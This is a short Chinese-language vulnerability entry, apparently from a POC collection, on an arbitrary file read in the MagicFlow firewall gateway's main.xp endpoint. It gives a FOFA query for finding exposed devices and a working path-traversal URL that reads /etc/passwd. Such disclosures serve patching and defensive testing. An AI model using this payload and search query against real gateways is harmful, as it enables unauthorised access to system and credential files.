# MagicFlow-防火墙网关-main.xp-任意文件读取漏洞

## 漏洞描述

MagicFlow 防火墙网关 main.xp 存在任意文件读取漏洞，攻击者通过构造特定的Url获取敏感文件

## 漏洞影响

> [!NOTE]
>
> MagicFlow 防火墙网关

## FOFA

> [!NOTE]
>
> app="MSA/1.0"

## 漏洞复现

登录页面如下

![image-20210609181301702](MagicFlow-防火墙网关-main.xp-任意文件读取漏洞.assets/1627363584971075.jpg)

构造POC

```
/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
```

![image-20210609182245927](MagicFlow-防火墙网关-main.xp-任意文件读取漏洞.assets/1627363585248273.jpg)